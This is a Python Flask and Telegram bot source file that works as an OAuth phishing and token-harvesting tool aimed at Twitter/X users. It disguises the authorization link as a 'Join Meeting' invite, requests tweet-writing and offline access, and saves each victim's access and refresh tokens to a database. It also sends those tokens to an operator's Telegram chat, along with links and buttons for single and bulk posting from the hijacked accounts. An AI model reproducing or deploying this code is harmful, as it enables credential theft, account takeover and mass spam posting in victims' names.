import base64
import hashlib
import os
import requests
from flask import Flask, redirect, request, session, render_template
from datetime import datetime
import sqlite3
import random
import time
from requests_oauthlib import OAuth2Session
from telegram import Bot, Update
from telegram.ext import Dispatcher, CallbackQueryHandler, CommandHandler, MessageHandler, Filters, CallbackContext

# Configuration
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
CALLBACK_URL = os.getenv('CALLBACK_URL')
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Database setup
def init_db():
    conn = sqlite3.connect('tokens.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            access_token TEXT,
            refresh_token TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# Generate code verifier and challenge
def generate_code_verifier_and_challenge():
    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode()).digest()
    ).rstrip(b'=').decode('utf-8')
    return code_verifier, code_challenge

# Function to send a startup message to Telegram
def send_startup_message():
    state = "0"  # Fixed state value for initialization
    code_verifier, code_challenge = generate_code_verifier_and_challenge()

    # Generate the OAuth link
    authorization_url = (
        f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
        f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
        f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
    )

    # Generate the meeting link
    meeting_link = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"

    # Message content with buttons
    message = (
        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
        f"📅 *Meeting Link:*\n[Join Meeting]({meeting_link})\n\n"
        "Please use the buttons below to interact with the bot."
    )

    # Send the message to Telegram
    bot = Bot(token=TELEGRAM_BOT_TOKEN)
    bot.send_message(
        chat_id=TELEGRAM_CHAT_ID,
        text=message,
        parse_mode="Markdown",
        reply_markup={
            "inline_keyboard": [
                [
                    {"text": "Single Post", "callback_data": "single_post"},
                    {"text": "Bulk Post", "callback_data": "bulk_post"}
                ],
                [
                    {"text": "Refresh Token", "callback_data": "refresh_token"}
                ]
            ]
        }
    )

# Telegram command to handle button interactions
def handle_button(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()  # Acknowledge the callback

    if query.data == 'single_post':
        query.edit_message_text(text="Please enter the content of your tweet.")
    elif query.data == 'bulk_post':
        query.edit_message_text(text="Please enter the content of your tweet and specify the number of tokens to use.")
    elif query.data == 'refresh_token':
        query.edit_message_text(text="Please enter your refresh token.")

# Flask route for webhook
@app.route(f"/{TELEGRAM_BOT_TOKEN}", methods=['POST'])
def webhook():
    update = request.get_json()
    dispatcher = Dispatcher(bot=Bot(token=TELEGRAM_BOT_TOKEN), update_queue=None)
    dispatcher.add_handler(CallbackQueryHandler(handle_button))
    dispatcher.process_update(Update.de_json(update))
    return 'ok', 200

@app.route('/')
def home():
    code = request.args.get('code')
    state = request.args.get('state')
    error = request.args.get('error')

    if not code:
        state = "0"  # Use fixed state value
        session['oauth_state'] = state

        code_verifier, code_challenge = generate_code_verifier_and_challenge()
        session['code_verifier'] = code_verifier  

        authorization_url = (
            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
        )

        return redirect(authorization_url)

    if code:
        if error:
            return f"Error during authorization: {error}", 400

        if state != "0":  
            return "Invalid state parameter", 403

        code_verifier = session.pop('code_verifier', None)

        token_url = "https://api.twitter.com/2/oauth2/token"
        data = {
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': CALLBACK_URL,
            'code_verifier': code_verifier
        }

        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
        token_response = response.json()

        if response.status_code == 200:
            access_token = token_response.get('access_token')
            refresh_token = token_response.get('refresh_token')

            session['access_token'] = access_token
            session['refresh_token'] = refresh_token

            username = get_twitter_username(access_token)
            save_token(username, access_token, refresh_token)
            send_to_telegram(access_token, refresh_token)
            return redirect('/thanks')  # Redirect to thanks page

@app.route('/thanks')
def thanks():
    return render_template('thanks.html')

@app.route('/tweet/<access_token>', methods=['GET', 'POST'])
def tweet(access_token):
    if request.method == 'POST':
        tweet_text = request.form['tweet_text']
        tweet_id = post_tweet(access_token, tweet_text)
        if tweet_id:
            username = get_twitter_username(access_token)
            tweet_link = f"https://twitter.com/{username}/status/{tweet_id}"
            tweet_details = {
                'username': username,
                'link': tweet_link,
                'time': datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
            }
            send_to_telegram(tweet_details)
            return render_template('tweet_result.html', result=f"Tweet posted successfully: {tweet_link}")
        return render_template('tweet_result.html', result="Failed to post tweet.")

    return render_template('tweet_form.html', access_token=access_token)

# Function to send access and refresh tokens to Telegram
def send_to_telegram(access_token, refresh_token=None):
    alert_emoji = "🚨"
    key_emoji = "🔑"

    username = get_twitter_username(access_token)
    twitter_url = f"https://twitter.com/{username}" if username else "Unknown user"

    message = f"{alert_emoji} *New user authenticated: OAuth 2.0*\n"
    message += f"{key_emoji} *Access Token:* `{access_token}`\n"

    if refresh_token:
        refresh_link = f"{CALLBACK_URL}/refresh/{refresh_token}"
        message += f"{key_emoji} *Refresh Token Link:* [Refresh Token]({refresh_link})\n"

    tweet_link = f"{CALLBACK_URL}/tweet/{access_token}"
    message += f"{key_emoji} *Post a Tweet Link:* [Post a Tweet]({tweet_link})\n"
    message += f"👤 *Twitter Profile:* [@{username}]({twitter_url})"

    bot = Bot(token=TELEGRAM_BOT_TOKEN)
    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message, parse_mode="Markdown")

# Function to post a tweet
def post_tweet(access_token, tweet_text):
    TWITTER_API_URL = "https://api.twitter.com/2/tweets"
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json"
    }
    payload = {
        "text": tweet_text
    }

    response = requests.post(TWITTER_API_URL, json=payload, headers=headers)

    if response.status_code == 201:
        tweet_data = response.json()
        return tweet_data['data']['id']
    else:
        return None

# Get username from access token
def get_twitter_username(access_token):
    url = "https://api.twitter.com/2/users/me"
    headers = {
        "Authorization": f"Bearer {access_token}"
    }
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        data = response.json()
        return data.get("data", {}).get("username")
    return None

# Save token to SQLite database
def save_token(username, access_token, refresh_token):
    conn = sqlite3.connect('tokens.db')
    cursor = conn.cursor()
    cursor.execute('INSERT INTO tokens (username, access_token, refresh_token) VALUES (?, ?, ?)', 
                   (username, access_token, refresh_token))
    conn.commit()
    conn.close()

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    send_startup_message()  # Send the startup message with OAuth and meeting links
    app.run(host='0.0.0.0', port=port)
